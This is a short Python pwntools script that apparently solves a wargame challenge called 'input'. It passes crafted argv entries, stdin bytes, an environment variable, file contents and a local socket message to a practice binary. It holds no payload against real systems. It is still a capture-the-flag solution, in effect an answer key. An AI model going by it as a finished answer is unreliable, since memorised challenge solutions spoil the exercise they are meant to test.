from pwn import *

cmd = ["./input"]
# cmd = ["/home/input2/input"]
for i in range(1, 100):
    if i == 65:
        cmd.append(b"\x00")
    elif i == 66:
        cmd.append(b"\x20\x0a\x0d")
    elif i == 67:
        cmd.append(b"50008")
    else:
        cmd.append(str.encode("{}".format(i)))

print("[info] cmd = {}".format(cmd))

f = open("/tmp/stderr", "wb+")
f.write(b"\x00\x0a\x02\xff")
f.close()

f = open("\x0a", "wb+")
f.write(b"\x00\x00\x00\x00")
f.close()

io = process(cmd, env = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}, stderr=open("/tmp/stderr"))

io.sendline(b"\x00\x0a\x00\xff")

io.recvuntil("Stage 4 clear!")
client = socket.socket()
client.connect(("127.0.0.1", 50008))
client.send(b"\xde\xad\xbe\xef")

io.interactive()